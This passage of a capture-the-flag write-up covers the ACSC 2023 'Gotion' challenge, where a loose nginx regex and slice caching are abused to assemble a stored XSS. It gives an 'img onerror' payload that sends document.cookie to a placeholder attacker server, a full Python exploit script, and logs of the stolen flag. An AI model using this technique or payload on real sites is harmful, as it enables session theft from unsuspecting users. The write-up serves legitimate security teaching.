+<h3 id="solution-1">Solution<a href="#solution-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h4 id="part-i-sussy-nginx-configuration">Part I: Sussy nginx configuration<a href="#part-i-sussy-nginx-configuration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>We are given <em>nginx</em>'s configuration:</p>
+<pre tabindex="0"><code class="language-conf" data-lang="conf">proxy_cache_path /tmp/nginx keys_zone=mycache:10m;
+server {
+    listen 80;
+
+    location ~ .mp4$ {
+        # Smart and Efficient Byte-Range Caching with NGINX
+        # https://www.nginx.com/blog/smart-efficient-byte-range-caching-nginx/
+        proxy_cache mycache;
+        slice              4096; # Maybe it should be bigger?
+        proxy_cache_key    $host$uri$is_args$args$slice_range;
+        # $is_args = &#39;?&#39; if there are arguments, and $is_args = &#39;&#39; otherwise
+        # $args are the GET parameters, e.g. ?foo=bar
+        # $slice_range, for example, could be &#34;bytes=0-4095&#34;
+        proxy_set_header   Range $slice_range;
+        proxy_http_version 1.1;
+        proxy_cache_valid  200 206 1h;
+        proxy_pass http://app:3000;
+    }
+
+    location / {
+        proxy_pass http://app:3000;
+    }
+}
+</code></pre><p>When I read the configuration file, <code>.mp4$</code> has caught my attention. From the use of <code>$</code>, it is supposed to be a regular expression. In that case <code>.</code> would be a wildcard. Thus, paths ending with <code>[WHATEVER]mp4</code> (instead of <code>.mp4</code>) would be cached.</p>
+<p>We can create a note titled <code>mp4</code> (the path generated would be <code>/notes/[UUID]-mp4</code>) to verify the caching behaviour. For instance, we can see that a cache file is created under <code>/tmp/nginx</code>, with cache key being <code>localhost/notes/[UUID]-mp4bytes=0-4095</code>:</p>
+
+
+<figure>
+  <img src="/images/2023-03-29-acsc/gotion-mp4-cached.png" title="">
+  
+</figure>
+
+<p>If we create a large enough note (for instance, if we set the body to be 1024 <code>&amp;</code>s, then the response would end up ~13 kB). In that case, the response will be cached into four parts: $[0, 4096)$, $[4096, 8192)$, $[8192, 12288)$ and $[12288, 16384)$.</p>
+<pre class='language-bash command-line' data-output='2-8, 10-20, 22-32, 34-44, 46-56' data-user='mystiz' data-host='fixa'>
+<code class="language-bash">ls -al /tmp/nginx
+total 36
+drwx------ 2 nginx root  4096 Mar 28 15:20 .
+drwxrwxrwt 1 root  root  4096 Mar 28 15:21 ..
+-rw------- 1 nginx nginx 4768 Mar 28 15:20 3d9b2fdc36fefca75ea9cff6c01f171c
+-rw------- 1 nginx nginx 4760 Mar 28 15:20 6a6f810a210e00434094f6110e74dd9e
+-rw------- 1 nginx nginx 4766 Mar 28 15:20 dd674b8be2b1b457d437487bd125d57b
+-rw------- 1 nginx nginx  879 Mar 28 15:20 ea5c57612df19a2c0bd7a4880fa46c18
+hd /tmp/nginx/6a6f810a210e00434094f6110e74dd9e | head -n 11
+00000000  05 00 00 00 00 00 00 00  c8 13 23 64 00 00 00 00  |..........#d....|
+00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+00000020  cb ec 1f 64 00 00 00 00  b8 05 23 64 00 00 00 00  |...d......#d....|
+00000030  34 c3 61 18 00 00 9b 01  98 02 00 00 00 00 00 00  |4.a.............|
+00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00000150  0a 4b 45 59 3a 20 6c 6f  63 61 6c 68 6f 73 74 2f  |.KEY: localhost/|
+00000160  6e 6f 74 65 73 2f 65 34  64 38 39 31 66 30 2d 30  |notes/e4d891f0-0|
+00000170  32 63 62 2d 34 65 38 62  2d 38 33 62 65 2d 35 34  |2cb-4e8b-83be-54|
+00000180  37 65 30 61 66 63 63 64  32 32 2d 6d 70 34 62 79  |7e0afccd22-mp4by|
+00000190  74 65 73 3d 30 2d 34 30  39 35 0a 48 54 54 50 2f  |tes=0-4095.HTTP/|
+hd /tmp/nginx/dd674b8be2b1b457d437487bd125d57b | head -n 11
+00000000  05 00 00 00 00 00 00 00  c8 13 23 64 00 00 00 00  |..........#d....|
+00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+00000020  cb ec 1f 64 00 00 00 00  b8 05 23 64 00 00 00 00  |...d......#d....|
+00000030  96 5d 64 16 00 00 9e 01  9e 02 00 00 00 00 00 00  |.]d.............|
+00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00000150  0a 4b 45 59 3a 20 6c 6f  63 61 6c 68 6f 73 74 2f  |.KEY: localhost/|
+00000160  6e 6f 74 65 73 2f 65 34  64 38 39 31 66 30 2d 30  |notes/e4d891f0-0|
+00000170  32 63 62 2d 34 65 38 62  2d 38 33 62 65 2d 35 34  |2cb-4e8b-83be-54|
+00000180  37 65 30 61 66 63 63 64  32 32 2d 6d 70 34 62 79  |7e0afccd22-mp4by|
+00000190  74 65 73 3d 34 30 39 36  2d 38 31 39 31 0a 48 54  |tes=4096-8191.HT|
+hd /tmp/nginx/3d9b2fdc36fefca75ea9cff6c01f171c | head -n 11
+00000000  05 00 00 00 00 00 00 00  c8 13 23 64 00 00 00 00  |..........#d....|
+00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+00000020  cb ec 1f 64 00 00 00 00  b8 05 23 64 00 00 00 00  |...d......#d....|
+00000030  47 51 ff 48 00 00 9f 01  a0 02 00 00 00 00 00 00  |GQ.H............|
+00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00000150  0a 4b 45 59 3a 20 6c 6f  63 61 6c 68 6f 73 74 2f  |.KEY: localhost/|
+00000160  6e 6f 74 65 73 2f 65 34  64 38 39 31 66 30 2d 30  |notes/e4d891f0-0|
+00000170  32 63 62 2d 34 65 38 62  2d 38 33 62 65 2d 35 34  |2cb-4e8b-83be-54|
+00000180  37 65 30 61 66 63 63 64  32 32 2d 6d 70 34 62 79  |7e0afccd22-mp4by|
+00000190  74 65 73 3d 38 31 39 32  2d 31 32 32 38 37 0a 48  |tes=8192-12287.H|
+hd /tmp/nginx/ea5c57612df19a2c0bd7a4880fa46c18 | head -n 11
+00000000  05 00 00 00 00 00 00 00  c8 13 23 64 00 00 00 00  |..........#d....|
+00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+00000020  cb ec 1f 64 00 00 00 00  b8 05 23 64 00 00 00 00  |...d......#d....|
+00000030  4a cd 30 04 00 00 a0 01  a1 02 00 00 00 00 00 00  |J.0.............|
+00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00000150  0a 4b 45 59 3a 20 6c 6f  63 61 6c 68 6f 73 74 2f  |.KEY: localhost/|
+00000160  6e 6f 74 65 73 2f 65 34  64 38 39 31 66 30 2d 30  |notes/e4d891f0-0|
+00000170  32 63 62 2d 34 65 38 62  2d 38 33 62 65 2d 35 34  |2cb-4e8b-83be-54|
+00000180  37 65 30 61 66 63 63 64  32 32 2d 6d 70 34 62 79  |7e0afccd22-mp4by|
+00000190  74 65 73 3d 31 32 32 38  38 2d 31 36 33 38 33 0a  |tes=12288-16383.|</code>
+</pre>
+
+<p>In particular, we can selectively cache part of the HTTP response using the <code>Range</code> header. For instance, we can only cache bytes $[4096, 8192)$ using</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://localhost:30080/notes/<span class="o">[</span>UUID<span class="o">]</span>-mp4 -H <span class="s1">&#39;Range: bytes=4096-4096&#39;</span>
+</span></span></code></pre></div><h4 id="part-ii-caching-the-xss-payload">Part II: Caching the XSS payload<a href="#part-ii-caching-the-xss-payload" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p><a href="https://pkg.go.dev/html/template"
+   
+   target="_blank" rel="noopener noreferrer" ><code>html/template</code></a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg> sanitizes the user input properly. For example, <code>&lt;</code> would be replaced to <code>&amp;lt;</code>. If we want to start a HTML tag (i.e., getting a <code>&lt;</code>), we have to use the one existed in the template.</p>
+<p>The below HTML snippet is the first 4096 bytes if we set the title to be <code>mp4</code> and the body to be <code>&amp;&amp;&amp;...&amp;&gt;</code> (622 <code>&amp;</code>'s). In particular, the last byte is a <code>&lt;</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  [...SNIPPED...]
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;container&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;card mt-5&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;card-body&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">h4</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;card-title&#34;</span><span class="p">&gt;</span>mp4<span class="p">&lt;/</span><span class="nt">h4</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">pre</span><span class="p">&gt;</span><span class="ni">&amp;amp;&amp;amp;&amp;amp;</span> [...SNIPPED...] <span class="ni">&amp;amp;&amp;amp;&amp;amp;&amp;gt;</span><span class="err">&lt;</span>
+</span></span></code></pre></div><p>On the other hand, if we set the body to</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">&amp;&amp;&amp;...&amp;img onerror=window.location=`http://MY_SECRET_SERVER:4444/2?${document.cookie}` src=x 
+</span></span></code></pre></div><p>The bytes in $[4096, 8192)$ in the HTTP response would be</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">img onerror=window.location=`http://MY_SECRET_SERVER:4444/2?${document.cookie}` src=x <span class="p">&lt;/</span><span class="nt">pre</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">button</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn btn-link&#34;</span> <span class="na">data-bs-toggle</span><span class="o">=</span><span class="s">&#34;collapse&#34;</span> <span class="na">data-bs-target</span><span class="o">=</span><span class="s">&#34;#editNote&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        Edit
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;/report&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;report&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;path&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;notes/[UUID]-mp4&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">button</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;g-recaptcha btn btn-link&#34;</span> <span class="na">data-sitekey</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="na">data-callback</span><span class="o">=</span><span class="s">&#34;onReport&#34;</span>
+</span></span><span class="line"><span class="cl">          <span class="na">data-action</span><span class="o">=</span><span class="s">&#34;submit&#34;</span><span class="p">&gt;</span>Report<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    [...SNIPPED...]
+</span></span></code></pre></div><p>If we concatenate the responses, we can see that there is an image tag in between:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">onerror</span><span class="o">=</span><span class="s">window.location=`http://MY_SECRET_SERVER:4444/2?${document.cookie}`</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="err">&lt;/</span><span class="na">pre</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>The image tag would be rendered if we cache the two responses individually. Now we can report it to the admins and get their cookies stolen:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">ACSC{character_appears_at_the_last_of_video_is_shobon_not_amongus}
+</span></span></code></pre></div><h3 id="solution-script">Solution script<a href="#solution-script" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># HOST = &#39;http://gotion-2.chal.ctf.acsc.asia:30080&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">HOST</span> <span class="o">=</span> <span class="s1">&#39;http://localhost:30080&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Now the 4096th byte is a &#34;&lt;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Setting allow_redirects=False to avoid reading the note after it is created.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># This is to prevent the HTTP response getting cached.</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">HOST</span><span class="si">}</span><span class="s1">/new-note&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="s1">&#39;mp4&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;body&#39;</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;&amp;&#39;</span><span class="o">*</span><span class="mi">622</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">},</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">note_url</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;location&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">note_id</span> <span class="o">=</span> <span class="n">note_url</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">HOST</span><span class="si">}{</span><span class="n">note_url</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;range&#39;</span><span class="p">:</span> <span class="s1">&#39;bytes=0-0&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Now the first cache ends with a &#39;&lt;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">HOST</span><span class="si">}</span><span class="s1">/update-note&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;noteId&#39;</span><span class="p">:</span> <span class="n">note_id</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="s1">&#39;mp4&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;body&#39;</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;&amp;&#39;</span><span class="o">*</span><span class="mi">623</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;img onerror=window.location=`http://MY_SECRET_SERVER:4444/2?$</span><span class="si">{document.cookie}</span><span class="s1">` src=http://MY_SECRET_SERVER:4444/1 &#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">},</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">HOST</span><span class="si">}{</span><span class="n">note_url</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;range&#39;</span><span class="p">:</span> <span class="s1">&#39;bytes=4096-4096&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ...and the second cache starts with &#39;img onerror=window.location=`http://MY_SECRET_SERVER:4444/2?${document.cookie}` src=http://MY_SECRET_SERVER:4444/1 &lt;/pre&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># report this link to the server!</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">note_url</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># ACSC{character_appears_at_the_last_of_video_is_shobon_not_amongus}</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1"># Logs from MY_SECRET_SERVER:4444
+</span></span></span><span class="line"><span class="cl"><span class="s1">35.194.228.105 - - [25/Feb/2023 22:08:56] code 404, message File not found
+</span></span></span><span class="line"><span class="cl"><span class="s1">35.194.228.105 - - [25/Feb/2023 22:08:56] &#34;GET /1 HTTP/1.1&#34; 404 -
+</span></span></span><span class="line"><span class="cl"><span class="s1">35.194.228.105 - - [25/Feb/2023 22:08:56] code 404, message File not found
+</span></span></span><span class="line"><span class="cl"><span class="s1">35.194.228.105 - - [25/Feb/2023 22:08:56] &#34;GET /2?FLAG=ACSC</span><span class="si">{character_appears_at_the_last_of_video_is_shobon_not_amongus}</span><span class="s1"> HTTP/1.1&#34; 404 -
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span></code></pre></div><div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p>Mark McGranaghan and Eli Bendersky (2022) &quot;Go by Example: Struct Embedding&quot;<br>
+<a href="https://gobyexample.com/struct-embedding"
+   
+   target="_blank" rel="noopener noreferrer" >https://gobyexample.com/struct-embedding</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
+
+        </div></div>
+
+      
+      <aside class="toc-container">
+        <a href="#" class="toc-title-link">
+          ACSC 2023 Quals (I): Gotion and easySSTI
+        </a>
+        <div class="js-toc"></div>
+      </aside>
+      
+
+      
+      <div class="py-3">
+        
+          <a class="btn" href="/posts/2023/2023-06-26-google-ctf-mhk2/">← Google CTF 2023: MHK2</a>
+        
+
+        
+          <a class="btn float-end" href="/posts/2023/2023-03-12-idekctf/">idekCTF 2022* Writeup →</a>
+        
+      </div>
+      
+
+    </div>
+  </div>
+
+    </div>
+  </main>
+  <div class="container">
+  <footer class="py-3 my-4 border-top">
+    <p class="text-center text-body-secondary">&copy; 2025 Powered by <em>Hugo</em>. Theme crafted by <em>Mystiz</em> with Bootstrap 5, inspired from <em>Terminal</em>.</p>
+  </footer>
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.27/dist/katex.min.css"
+  integrity="sha384-Pu5+C18nP5dwykLJOhd2U4Xen7rjScHN/qusop27hdd2drI+lL5KvX7YntvT8yew" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.27/dist/katex.min.js"
+  integrity="sha384-2B8pfmZZ6JlVoScJm/5hQfNS2TI/6hPqDZInzzPc8oHpN5SgeNOf4LzREO6p5YtZ" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.27/dist/contrib/auto-render.min.js"
+  integrity="sha384-hCXGrW6PitJEwbkoStFjeJxv+fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"
+  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }], trust: true })"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/@viz-js/viz@3.24.0/dist/viz-global.min.js"></script>
+<script>
+Viz.instance().then(viz => {
+  const unescape = function (s) {
+    const t = s.replace(/&amp;/g, '&')
+    return t.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&#34;/g, '"')
+  }
+
+  document.querySelectorAll('[class=graphviz]').forEach(node => {
+    const source = unescape(node.innerText);
+    console.log(source);
+    const svg = viz.renderSVGElement(source, { engine: 'dot' });
+    console.log(2);
+    node.parentNode.appendChild(svg);
+    node.style.display = 'none';
+  });
+});
+</script>
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.36.4/tocbot.min.js"
+  integrity="sha512-BZUSsJAPNtkd+kdY/bD7hvQKZ5zlgWt++KGy/Pa/5uEJNgs0jZ6JaX6MuclRUanowuxmhb5S3LRPEa3QmrUVfA==" crossorigin="anonymous"
+  referrerpolicy="no-referrer"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.36.4/tocbot.min.css"
+  integrity="sha512-/ANQiHMqpRl+E0zEAd250N21OOmJsYbhiJWY0Y8yG0TII47yZn1+gDNobMlf+h/FTyImprLXYgXbX3bCYyq/vg==" crossorigin="anonymous"
+  referrerpolicy="no-referrer" />
+<script type="text/javascript">
+tocbot.init({
+  headingSelector: 'h1, h2, h3, h4',
+  orderedList: false,
+  collapseDepth: 2,
+  headingsOffset: 60,
+  scrollSmoothOffset: -60
+})
+</script>
+
+
+<script>
+  document.querySelectorAll('pre code').forEach(el => {
+    console.log(el)
+    const lang = Array.from(el.classList).find(className => className.startsWith('language-'));
+    if (!lang) return;
+
+    
+    if (lang.startsWith('language-diff-')) {
+      el.classList.add('diff-highlight');
+    }
+  })
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+<script>
+mermaid.initialize({
+  startOnLoad: true,
+  htmlLabels: true,
+  securityLevel: "loose",
+  theme: 'base',
+  themeVariables: {
+    background: '#22222c',
+    primaryColor: '#33333c',
+    primaryTextColor: '#ffe4e1',
+  }
+});
+</script>
+
+</body>
+</html>
